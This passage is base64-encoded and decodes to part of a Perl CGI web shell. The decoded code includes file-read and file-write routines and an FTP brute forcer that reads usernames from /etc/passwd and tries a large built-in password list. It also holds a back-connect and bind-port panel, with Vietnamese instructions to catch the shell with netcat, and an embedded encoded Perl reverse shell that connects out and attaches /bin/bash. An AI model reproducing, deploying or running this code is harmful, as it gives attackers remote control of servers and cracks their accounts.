sYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCgk8YnI+Q29tbWFuZDogPHJ1bj4gJFJ1bkNvbW1hbmQgPC9ydW4+DQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZmlsZSIgdmFsdWU9IiRmaWxlIiA+ICRzYXZlIDxicj4gJG1zZw0KCTxicj48dGV4dGFyZWEgaWQ9ImRhdGEiIG5hbWU9ImRhdGEiIGNvbHM9IiRjb2xzIiByb3dzPSIkcm93cyIgc3BlbGxjaGVjaz0iZmFsc2UiPg0KRU5EDQoJDQoJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygmRmlsZU9wZW4oJEZpbGUsMCkpOw0KCSRyZXN1bHQgLj0gIjwvdGV4dGFyZWE+IjsNCgkkcmVzdWx0IC49ICI8L2Zvcm0+IjsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCiMgRmlsZSBPcGVuDQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpzdWIgRmlsZU9wZW4oJCl7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglteSAkYmluYXJ5ID0gc2hpZnQ7DQoJbXkgJHJlc3VsdCA9ICIiOw0KCW15ICRuID0gIiI7DQoJaWYoLWYgJGZpbGUpew0KCQlpZihvcGVuKEZJTEUsJGZpbGUpKXsNCgkJCWlmKCRiaW5hcnkpew0KCQkJCWJpbm1vZGUgRklMRTsNCgkJCX0NCgkJCXdoaWxlICgoJG4gPSByZWFkIEZJTEUsICRkYXRhLCAxMDI0KSAhPSAwKSB7DQoJCQkJJHJlc3VsdCAuPSAkZGF0YTsNCgkJCX0NCgkJCWNsb3NlKEZJTEUpOw0KCQl9DQoJfWVsc2UNCgl7DQoJCXJldHVybiAiTm90J3MgYSBGaWxlISI7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KIyBTYXZlIEZpbGUNCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCnN1YiBTYXZlRmlsZSgkKQ0Kew0KCW15ICREYXRhPSBzaGlmdCA7DQoJbXkgJEZpbGU9IHNoaWZ0Ow0KCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiRGaWxlOw0KCWlmKG9wZW4oRklMRSwgIj4kRmlsZSIpKQ0KCXsNCgkJYmlubW9kZSBGSUxFOw0KCQlwcmludCBGSUxFICREYXRhOw0KCQljbG9zZSBGSUxFOw0KCQlyZXR1cm4gMTsNCgl9ZWxzZQ0KCXsNCgkJcmV0dXJuIDA7DQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBCcnV0ZSBGb3JjZXIgRm9ybQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJydXRlRm9yY2VyRm9ybQ0Kew0KCW15ICRyZXN1bHQ9IiI7DQoJJHJlc3VsdCAuPSA8PEVORDsNCg0KPHRhYmxlPg0KDQo8dHI+DQo8dGQgY29sc3Bhbj0iMiIgYWxpZ249ImNlbnRlciI+DQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyM8YnI+DQpTaW1wbGUgRlRQIGJydXRlIGZvcmNlcjxicj4NCk5vdGU6IE9ubHkgc2NhbiBmcm9tIDEgdG8gMyB1c2VyIDotUzxicj4NCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQoNCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJicnV0ZWZvcmNlciIvPg0KPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+VXNlcjo8YnI+PHRleHRhcmVhIHJvd3M9IjE4IiBjb2xzPSIzMCIgbmFtZT0idXNlciI+DQpFTkQNCmNob3AoJHJlc3VsdCAuPSBgbGVzcyAvZXRjL3Bhc3N3ZCB8IGN1dCAtZDogLWYxYCk7DQokcmVzdWx0IC49IDw8J0VORCc7DQo8L3RleHRhcmVhPjwvdGQ+DQo8dGQ+DQoNClBhc3M6PGJyPg0KPHRleHRhcmVhIHJvd3M9IjE4IiBjb2xzPSIzMCIgbmFtZT0icGFzcyI+MTIzcGFzcw0KMTIzIUAjDQoxMjNhZG1pbg0KMTIzYWJjDQoxMjM0NTZhZG1pbg0KMTIzNDU1NDMyMQ0KMTIzNDQzMjENCnBhc3MxMjMNCmFkbWluDQphZG1pbmNwDQphZG1pbmlzdHJhdG9yDQptYXRraGF1DQpwYXNzYWRtaW4NCnBAc3N3b3JkDQpwQHNzdzByZA0KcGFzc3dvcmQNCjEyMzQ1Ng0KMTIzNDU2Nw0KMTIzNDU2NzgNCjEyMzQ1Njc4OQ0KMTIzNDU2Nzg5MA0KMTExMTExDQowMDAwMDANCjIyMjIyMg0KMzMzMzMzDQo0NDQ0NDQNCjU1NTU1NQ0KNjY2NjY2DQo3Nzc3NzcNCjg4ODg4OA0KOTk5OTk5DQoxMjMxMjMNCjIzNDIzNA0KMzQ1MzQ1DQo0NTY0NTYNCjU2NzU2Nw0KNjc4Njc4DQo3ODk3ODkNCjEyMzMyMQ0KNDU2NjU0DQo2NTQzMjENCjc2NTQzMjENCjg3NjU0MzIxDQo5ODc2NTQzMjENCjA5ODc2NTQzMjENCmFkbWluMTIzDQphZG1pbjEyMzQ1Ng0KYWJjZGVmDQphYmNhYmMNCiFAIyFAIw0KIUAjJCVeDQohQCMkJV4mKigNCiFAIyQkI0AhDQphYmMxMjMNCmFuaHlldWVtDQppbG92ZXlvdQ0Ka2hvbmdjb2dpDQpraG9uZ2NvcGFzcw0KNntKLjt9MjdVfjJiDQpIPUIoKypJT3kjelYNCkdBYTEtV30hW1JNIw0KWjBEJTVCLVdDRHFMDQpHT0Elb01xXmN0PWcNCil5ezhFRU1JLVhxeA0KaDZVZ356b2VhfSEpDQo1LFRnemJ4JnQ4PVENCkMwVWNBZC14STYlWw0KSnkubF89d3t5cnBTDQo9blJjUn49ZHF9LS4NCn1hfUAmM3tUOFE4Vw0KQU4jSCxHSUFEJGc7DQpUYXdkKHFuWkVhV20NClM5em5oUFUxJHVBZA0KWlBAMCpLYUNbRUYlDQptcXlYWkt0JGdjJTINCmU3c0stREMraUt5Ww0KQSlAJnt1RWVmKk11DQpLVSFbc2MmSipNeHYNCipfcD1TQGtdQ2JKOQ0KKTBOLUQ4KiUuZn5EDQpOVmFwX3Bza3JvR2gNCjtvW1AyS0RaeG92Ug0KZ3E7WklEbFB0PWU7DQpvNiNeIUR+N2U0UlYNCn1BQ0slJCNISXZvPQ0KcHFmcU5IMkQjbXNXDQpTfnJ5bEMwJHZwaUwNCn0/KGhSMFEmQn02JA0KQDtLbnZMcmMlLD1TDQpJdCVmYW5zSWQuNmMNCltVZFRBI3VOVF0rVw0KTUksO0A9bi5vZF9TDQolT09uXj00dTN3YSwNCj1zWE9wMVBWWkQpVQ0KNmVLNkRRUHBnbGVXDQpbUG9uYWMwQE1zMHsNClpnOXp5JmI1VGN9TQ0KZ19dVDFBUnRaSFBHDQpdT1MuM09+dCt4YSENCi1idVh4LF9eO11WKg0KdmRNNnNIOV9pfkYxDQo7YWNEMyEzdUMrdFINCmU1UXlLO3Yxd3RnZg0KeSZifXkrI0FKO31XDQo3VGg5TXJzeF8yN2UNCjN3QmFlaTFxNE10Yg0KeUIydzVFckNpRnFnDQo0JWJwIWVjTkxPaGYNCjQlYnAhZWNOTE9oZg0KUkwsaykwUUNkXUR7DQoqLT0jWl0jSCskUWINCkx4T0NdMkdaayVMeg0KZj17dWxFXlApTWRJDQpRczkqPVQ4YlRjb30NCldlZ1tNWC5SSTZzVA0KSG0sOH1BX350SDRxDQpnTUFmSGxMPXB4R0gNCmE3RFpEfUskeF57OA0KQTU/PUViLHdOaGJEDQpCQlh6OSlQb1t5NC4NClRbQyE3NHBvS0BrUQ0KMGQzLHFAN1tob09GDQo5X0M3cCFHO1dQUngNCjFEMzIldTlLZUZYTA0KLkZ9TCZ2ZHB9dHQhDQopRCtjQkpfKj9ETCoNCjQqR3VHOS53cyZeTw0KNkB+dSVOJG1KJiYyDQorS1hrSTtxZjQzemENCiVAOWU2ITJba10wKQ0KaUkhdj9Jc35xRi5zDQoxbWZ5RXc2QDMkfksNCkwrP35mVF8yZ29nNA0KS29+JSVAP2JaTEF9DQouQjhjSUF4TW8od1MNCmtPQEAoUT8zQysoYQ0KcSp1VENYfnlLQX0lDQpPQDAkVUZ2dHlCLiUNCiNidlouLkMrKi0rdg0KUihacCQ/ME1OVltGDQpTKUMsQmx4MTdzXk4NClNlW0RVOWd6VTR2TQ0KK0R5cHEkMjdbRUBdDQpKaF9LcStBMTFwZEgNCiRPe1NrR3BROGEkaQ0KJildRmtxRStCVHBBDQptfm5lVWxNfVg2ZTQNCnt4IylnMUxUZ11SIQ0KZGNSLlVJX1B2T31fDQptUiZ7UXU1Q0UpLCENCkFoW0shUWFGTF8jUA0KN3UqSlV+Z2NKS29jDQpoVSRCRUFfRyEtPzINCm10UkgyZ2YzIWlsdQ0KR0xXKUt1SCplQ34qDQoyT107YmZzZmguOTUNCiZ3QE4hLldyXWZ1eQ0KSyN7R3gkOVdQTEspDQpfUl1KQ041WyYlKy4NCjVaMm5hK2Qzc1VLPw0KTkdSYkNrJng0YUgrDQpBVU8mVFt1PUpdYiYNCl0kKiE4R30pKDE0Ng0KQnBNVHYyMTBIK1BGDQo0Y35xZzRvdngoR2INCjEwdF8uITEjWlRzXw0KWGU4QFQxaWRtRy4qDQpDJTRhTjFzSWltKT8NCkxYMC1tQ2JrWCMrVw0KTmtYMjljO0NpZmRuDQpJJWtvb3ksXzE5W3MNCjVJQVR6e2N+c25kKA0KNFF4diQ/cjN7bTZvDQo3O1VPaHNAZHBpVkANCkw/UEFTVi04RnptYQ0KWnJvbyxPPX1+LHJFDQpXM3UqaS15XUk1V2cNCmQ7cUNKeUNlNFdKbA0KOT10Ni55aH5WdjJtDQpKRkl7ISFBVngpeC4NCmMhPzB6b1NQLFFAaA0KP3BPI1hNSGE4bms3DQpWfnU7JFRUOUErdDsNCl0kSl1pO19YZmwxNQ0KRFNeNFZoRGZKcVV2DQotOFpodk9abTlQeFENCnksM1MsRlRTUUJeKQ0KMikqZ2g9WjMsfXhUDQprUFNCNlIuIT1Kb1ENCiUkOTY4SS5yeVs1Sg0KMkY2VyY0bitGbl5PDQorUXdAPTB9X0h7MlQNCnhrKX5DSzg3NFBXSw0KVnQuTlNSdkM4QmFkDQpBdHRoMlVnaDU3NEcNCndoZ09bNlpPWFtuKw0KbmFfNz97eWJheF01DQpKM2lGLH4qKGUlRkANCj0mRld+aFpEXXAlIw0KbnZsLjFMQ3VdRTEmDQomeGteUEUlaSFPI1ANCklXSkxsJmhKcXo9aQ0KXnowc1J4SnchQ0xvDQo4XlYjbCQ3K29mLlsNCjVsV0EsUDF+ZyhMMA0KQ0ZJR1V2YjtFM0tJDQpfR0AsQVFFUyR2TGUNCmxee0VuQSRuWzlOYg0KRTFnKDBecSNYbztnDQomTWhLRjE7VzNvMCYNCjUwNDIyQjJhZyZlbQ0KTDk1M0grbXZxS0dhDQpMKUZfUU9AeTJedGQNCkhBYktALSZUQVRTTQ0KIyM5bStkaSpKKUBiDQpmZCxiciVpVzUxck0NCiFFLW1eN01ORUx7TA0KJm8yJUpAX1JxW3VUDQokJkB5OHBFMFM9MEUNCkl1cm1yS3R6VCQ0OQ0KTFRdLlNYbyNsRDJwDQpSIztoJiEmLnpDSVINCkx3a3khLU8tQWZYJg0KWl49KldbaDNfaDsuDQpnTnJpY1Zxe2k9LS4NCixpfkA2IXcybmR6UQ0KcDZoU2J6cyNJS2cxDQpaaGJlbFR+TjJXeFcNCiYsc3I0VE9kb01BLQ0KM2tJdnJ6P15UUyNLDQpvVHYrMUBbNGg1e0MNCm1yX1hCQH5IRypwaQ0KXXFhUjYtVC4wLjlPDQpUUHcuQ0Q5WjYqTCQNCnMoQS5EQHh2TzUlOQ0KYiEjJkB2VHZOKi44DQosbyMpcjNULTVOZ1sNCmU2VyFmYlJncl11OQ0KJjtOMCQlRzgheVguDQpsKUlzViRSLSZXQDUNClB4VGtGM09iU25bNg0KXmxLYSxyfmM9KXQzDQpVW3d0KlcpfU9lSGUNCmh7RGN5aCotaH45QA0KYVNiOSVDcldOa01ODQpuIyMjbG4ucEB6aGsNCjkuK1BbV1AhKWctRw0KeWsrWzFSfmFAd0gwDQp5PTVyJF41Vl5wbVUNCjMlS25wVEYtZ21Vcg0KVUJ2Lkh+e28pbzhwDQpkS3s9KTc1JkVGVTUNCipFZXNnT0dJNHg/Ww0KRTZYNWsje0E2NXhUDQpwdXgpRFNrRkxJVGcNCnczSlZdITVpZH1BXQ0KVUJUM3UtMEgpfk0lDQo1JUMuN1smNzByfmwNCklKSVtIO240XjVVeA0KLUAwQyhTKn5BN3ZSDQpXQXIqTntPOEMoJGYNClQmK2haLSR2cnhmKQ0KdUZEc1EhZFZ7SEd7DQpNeEE3cncwa3pKJjQNCkxVTUVscTdGQzFaRA0Ke34lM30wKTF1WlApDQp2LW5MWmkhK2xVKCENCj11YT1UUVZRKSRwMA0KVm9JVFhvZl5IdV9eDQp6ckkmRVNvSH57VkgNClJvSywldn47Ll0sRg0KbCxETTY5TUNETnFfDQo2UFplMm5YeHlfZ3ANCnVpd1F+XVR5MmE1aw0KODA1VGJLSENXeColDQprcjNeYVc3QWt0UkUNClFxOCEqSUpVNCxrSQ0KWFViXzJtcH1EJVEyDQp4e0ROKUNFOzFxNDcNCkhyUiVAciR0SH17Ng0KbiFBZSo1c3JFcE9pDQpOQn1BR3dyVltYN3MNCjhecCEtJjtQZC12Iw0KciV0NmQzVyYtLEdQDQooay1nMSpkTSxVTHoNClUlcE9YMm4oZzNTLQ0KIzFfLipPbzA4VjYuDQpCdWcoK2RzYndISXUNClRjQn10QDQuTkt+Zg0KRzhfYWRvKztidUV5DQpuYXNWQi07MkxCMHkNCmYlWGVhcjIleWV3RQ0KQDcsdWlxdkpGJExBDQpJNH02LE1GMnhLYUINClZPZy5nRk1wPzssKQ0KUDhPMHopIyZvekQxDQpQblhOLjM3UUdYYioNCj9menZUT14xYXg0SA0KXmghTj1sYUhnQUNJDQpBNV1XKDBYa1tieE8NCmRbNWRJTiteKTVPNg0KaUFzOFF4TCZQVW4jDQpASzgrUV0uU0I7cHoNCmxVI0QuMUk5KWh5XQ0KXWRKXV1ndlU4XkxuDQo4MUdQVTR1T3FTRU0NCiVIX2JlWENLeUA/PQ0KXWFhfW15NTd9eEhTDQpUblBJQj9BbWEtXTMNCkJeOCojXmxBW2dmaw0KYTNBYzV4REQ7Q0gzDQomd3V9TWkuJURaT18NCm07WmMxLWlkXjQtbA0KP09pczhLVEw7VT1NDQpxfnZQN3JbRDlVZCwNCklQenktR0xTRjRrSg0KW3JoJVVUTHFUYUFSDQpDTWFJRC5hbF5zIUcNCjdrYmghazNrRUwtMA0KKE5Tc3AyZ0IkXyQ/DQouZlNoXmteezY7THgNCi5oOUdbMGE9TCRfNQ0KMVtAeHhmUFQ7KUJyDQpmKDN4cnNiLCMuaS0NCk0rTGw/SkNPM24yRQ0KdFt1RHBJY3YjWEMwDQowISxUTj07QixPI3oNCn5OdFU7dFtlJj1bNg0KcHt5K01oI1p9YTRMDQo5eXN+SU1oTFo9LXINCjdrOUQ0NnpUeyFiQQ0KRjFWJDg5ZFUsLUhMDQpSa0V2ZzJWNmVANlcNCjRDcUd6LCN0QExVWA0KX0RJY2JmbjtNUDJ6DQpVJFBwd193VklUKkwNCm5KeVhFTiMmV0tVQQ0KUT9zZVtRbEIob14mDQpKN1teJH1Ea15vTjkNCm1lYl5wLCosVigmaw0KdDtfMTQpe1BiOE1MDQp9PX5+ey02d1QwdFUNCjdYTG5GO2NGYUlldA0KI1c/a3hMQH5pY2RyDQpCNl82TC4yQltyI0UNCixGeWJrUno0I0ExdQ0KSXgmLFdUVltlZTlUDQpJLTVkaV50c0d5KTMNCnMyLHlkREkuRzIqQw0KY05Ud3glNFhVeDA4DQpjb0dEODs4cighU24NCl1RUjtdfjNwWEBrVA0KWkxePVBFLSQjNGI5DQpbSH1XZ2NuYXFsZVINCis2KFskYltBRkR0eQ0KeCEsKiNMc1dmV2RiDQpyaWUzJXNDWyN0RDANCi5NcmtoJmZaLSsyUQ0KfW9UXWlKaG11fnZIDQo1KFQtRF17SlVEckINClNCRDZYQX5QP2stIQ0KaT1pZV9sZnErbXBeDQpUe11FS2FBWG1kISgNClUxLEMmdk47ZX53OA0KTSQmUF90X1RjV3tTDQp0LlhTXzRATiFPSFENCnJHVSEhLV9FLW41cA0KLVtmWjlSWF1URWlIDQpXVlR6T2JwQS5IMlENCnMobWJbYklvbF11Ow0KTkF+enZlVWUmcXl9DQprZ0ZmbSo3cjExT2YNCj1AUENIdVhiTEVvdA0KZmR1QTExTGVGQkR9DQp1YlRnbTliPSxFQUYNCkoyQnNrR3tGWlRpXQ0KQF5iNH1YME1obGs9DQo1UyFsOVpAR144Qm4NCj02OT1Nci4lTGhYRg0KKF5CT0chW09sLUQ7DQo3TVFbJjJ+R3FJa3UNCjdwVy1PNH0jN1I2Zw0KZEVYOzBUVlJsSG8qDQotJn4jOU9xaXdabWgNCk5uUnQjfiR3ckd1QA0KazZyXiUpK3l3bnAuDQpEMSQ1dEVQSFhaezYNCkliPU0zUk4hVGhNTQ0KV0pTWDdaNFQjdz01DQpdUGEkNyZRS25nQigNCjwvdGV4dGFyZWE+DQo8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIiBhbGlnbj0iY2VudGVyIj4NClNsZWVwOjxzZWxlY3QgbmFtZT0ic2xlZXAiPg0KDQo8b3B0aW9uPjA8L29wdGlvbj4NCjxvcHRpb24+MTwvb3B0aW9uPg0KPG9wdGlvbj4yPC9vcHRpb24+DQoNCjxvcHRpb24+Mzwvb3B0aW9uPg0KPC9zZWxlY3Q+IA0KPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9InN1Ym1pdCIgdmFsdWU9IkJydXRlIEZvcmNlciIvPjwvdGQ+PC90cj4NCjwvZm9ybT4NCjwvdGFibGU+DQpFTkQNCnJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBCcnV0ZSBGb3JjZXINCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCcnV0ZUZvcmNlcg0Kew0KCW15ICRyZXN1bHQ9IiI7DQoJJFNlcnZlcj0kRU5WeydTRVJWRVJfQUREUid9Ow0KCWlmKCRpbnsndXNlcid9IGVxICIiKQ0KCXsNCgkJJHJlc3VsdCAuPSAmQnJ1dGVGb3JjZXJGb3JtOw0KCX1lbHNlDQoJew0KCQl1c2UgTmV0OjpGVFA7IA0KCQlAdXNlcj0gc3BsaXQoL1xuLywgJGlueyd1c2VyJ30pOw0KCQlAcGFzcz0gc3BsaXQoL1xuLywgJGlueydwYXNzJ30pOw0KCQljaG9tcChAdXNlcik7DQoJCWNob21wKEBwYXNzKTsNCgkJJHJlc3VsdCAuPSAiPGJyPjxicj5bK10gVHJ5aW5nIGJydXRlICRTZXJ2ZXJOYW1lPGJyPj09PT09PT09PT09PT09PT09PT09Pj4+Pj4+Pj4+Pj4+PDw8PDw8PDw8PD09PT09PT09PT09PT09PT09PT09PGJyPjxicj5cbiI7DQoJCWZvcmVhY2ggJHVzZXJuYW1lIChAdXNlcikNCgkJew0KCQkJaWYoJHVzZXJuYW1lIG5lICIiKQ0KCQkJew0KCQkJCWZvcmVhY2ggJHBhc3N3b3JkIChAcGFzcykNCgkJCQl7DQoJCQkJCSRmdHAgPSBOZXQ6OkZUUC0+bmV3KCRTZXJ2ZXIpIG9yIGRpZSAiQ291bGQgbm90IGNvbm5lY3QgdG8gJFNlcnZlck5hbWVcbiI7IA0KCQkJCQlpZigkZnRwLT5sb2dpbigiJHVzZXJuYW1lIiwiJHBhc3N3b3JkIikpDQoJCQkJCXsNCgkJCQkJCSRyZXN1bHQgLj0gIjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSdmdHA6Ly8kdXNlcm5hbWU6JHBhc3N3b3JkXEAkU2VydmVyJz5bK10gZnRwOi8vJHVzZXJuYW1lOiRwYXNzd29yZFxAJFNlcnZlcjwvYT48YnI+XG4iOw0KCQkJCQkJJGZ0cC0+cXVpdCgpOw0KCQkJCQkJYnJlYWs7DQoJCQkJCX0NCgkJCQkJaWYoJGlueydzbGVlcCd9IG5lICIwIikNCgkJCQkJew0KCQkJCQkJc2xlZXAoaW50KCRpbnsnc2xlZXAnfSkgKiAxMDAwKTsNCgkJCQkJfQ0KCQkJCQkkZnRwLT5xdWl0KCk7DQoJCQkJfQ0KCQkJfQ0KCQl9DQoJCSRyZXN1bHQgLj0gIlxuPGJyPj09PT09PT09PT0+Pj4+Pj4+Pj4+IEZpbmlzaGVkIDw8PDw8PDw8PDw9PT09PT09PT09PGJyPlxuIjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJhY2tjb25uZWN0IEZvcm0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCYWNrQmluZEZvcm0NCnsNCglyZXR1cm4gPDxFTkQ7DQoJPGJyPjxicj4NCg0KCTx0YWJsZT4NCgk8dHI+DQoJPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQoJPHRkPkJhY2tDb25uZWN0OiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYmFja2JpbmQiPjwvdGQ+DQoJPHRkPiBIb3N0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMjAiIG5hbWU9ImNsaWVudGFkZHIiIHZhbHVlPSIkRU5WeydSRU1PVEVfQUREUid9Ij4NCgkgUG9ydDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjYiIG5hbWU9ImNsaWVudHBvcnQiIHZhbHVlPSI4MCIgb25rZXl1cD0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JhJykuaW5uZXJIVE1MPXRoaXMudmFsdWU7Ij48L3RkPg0KDQoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkNvbm5lY3QiPjwvdGQ+DQoJPC9mb3JtPg0KCTwvdHI+DQoJPHRyPg0KCTx0ZCBjb2xzcGFuPTM+PGZvbnQgY29sb3I9I0ZGRkZGRj4NCglbK10gTW8gcG9ydCB0cmVuIG1vZGVtICENCgk8YnI+DQoJWytdIFRodSBraWVtIHRyYSB2aWVjIG1vIHBvcnQgYmFuZyB0cmFuZyBuYXkgPGEgdGFyZ2V0PSJfYmxhbmsiIGhyZWY9Imh0dHA6Ly93d3cuY2FueW91c2VlbWUub3JnLyI+aHR0cDovL3d3dy5jYW55b3VzZWVtZS5vcmcvPC9hPg0KCTxicj4NCglbK10gRHVuZyBuZXRjYXQgdHJlbiBtYXkgY2EgbmhhbiBjaGF5IGxlbiA8cnVuPm5jIC12diAtbCAtcCA8c3BhbiBpZD0iYmEiPjgwPC9zcGFuPjwvcnVuPg0KCTxicj4NCglbK10gQmFtIG51dCBjb25uZWN0IHRyZW4gc2hlbGw8L2ZvbnQ+PC90ZD4NCg0KCTwvdHI+DQoJPC90YWJsZT4NCg0KCTxicj48YnI+DQoJPHRhYmxlPg0KCTx0cj4NCgk8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCgk8dGQ+QmluZCBQb3J0OiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYmFja2JpbmQiPjwvdGQ+DQoNCgk8dGQ+IFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxNSIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjE0MTIiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiaScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+DQoNCgkgUGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxMiIgbmFtZT0iYmluZHBhc3MiIHZhbHVlPSJ2aW5ha2lkIj48L3RkPg0KCTx0ZD48aW5wdXQgbmFtZT0icyIgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJCaW5kIj48L3RkPg0KCTwvZm9ybT4NCgk8L3RyPg0KCTx0cj4NCgk8dGQgY29sc3Bhbj0zPjxmb250IGNvbG9yPSNGRkZGRkY+WytdIERhbmcga2llbSB0cmEgLi4uLg0KCTxicj5bK10gVGh1IHZvaSBjb21tYW5kOiA8cnVuPm5jICRFTlZ7J1NFUlZFUl9BRERSJ30gPHNwYW4gaWQ9ImJpIj4xNDEyPC9zcGFuPjwvcnVuPjwvZm9udD48L3RkPg0KDQoJPC90cj4NCgk8L3RhYmxlPjxicj4NCkVORA0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBCYWNrY29ubmVjdCB1c2UgcGVybA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJhY2tCaW5kDQp7DQoJdXNlIFNvY2tldDsJDQoJJGJhY2twZXJsPSJJeUV2ZFhOeUwySnBiaTl3WlhKc0RRcDFjMlVnU1U4Nk9sTnZZMnRsZERzTkNpUlRhR1ZzYkFrOUlDSXZZbWx1TDJKaGMyZ2lPdzBLSkVGU1IwTTlRRUZTUjFZN0RRcDFjMlVnVTI5amEyVjBPdzBLZFhObElFWnBiR1ZJWVc1a2JHVTdEUXB6YjJOclpYUW9VMDlEUzBWVUxDQlFSbDlKVGtWVUxDQlRUME5MWDFOVVVrVkJUU3dnWjJWMGNISnZkRzlpZVc1aGJXVW9JblJqY0NJcEtTQnZjaUJrYVdVZ2NISnBiblFnSWxzdFhTQlZibUZpYkdVZ2RHOGdVbVZ6YjJ4MlpTQkliM04wWEc0aU93MEtZMjl1Ym1WamRDaFRUME5MUlZRc0lITnZZMnRoWkdSeVgybHVLQ1JCVWtkV1d6RmRMQ0JwYm1WMFgyRjBiMjRvSkVGU1IxWmJNRjBwS1NrZ2IzSWdaR2xsSUhCeWFXNTBJQ0piTFYwZ1ZXNWhZbXhsSUhSdklFTnZibTVsWTNRZ1NHOXpkRnh1SWpzTkNuQnlhVzUwSUNKRGIyNXVaV04wWldRaElqc05DbE5QUTB0RlZDMCtZWFYwYjJac2RYTm9LQ2s3RFFwdmNHVnVLRk5VUkVsT0xDQWlQaVpUVDBOTFJWUWlLVHNOQ205d1pXNG9VMVJFVDFWVUxDSStKbE5QUTB0RlZDSXBPdzBLYjNCbGJpaFRWRVJGVWxJc0lqNG1VMDlEUzBWVUlpazdEUXB3Y21sdWRDQWlMUzA5UFNCRGIyNXVaV04wWldRZ1FtRmphMlJ2YjNJZ1BUMHRMU0FnWEc1Y2JpSTdEUXB6ZVhOMFpXMG9JblZ1YzJWMElFaEpVMVJHU1V4Rk95QjFibk5sZENCVFFWWkZTRWxUVkNBN1pXTm9ieUFuV3l0ZElGTjVjM1JsYldsdVptODZJQ2M3SUhWdVlXMWxJQzFoTzJWamFHODdaV05vYnlBbld5dGRJRlZ6WlhKcGJtWnZPaUFuT3lCcFpEdGxZMmh2TzJWamFHOGdKMXNyWFNCRWFYSmxZM1J2Y25rNklDYzdJSEIzWkR0bFkyaHZPeUJsWTJodklDZGJLMTBnVTJobGJHdzZJQ2M3S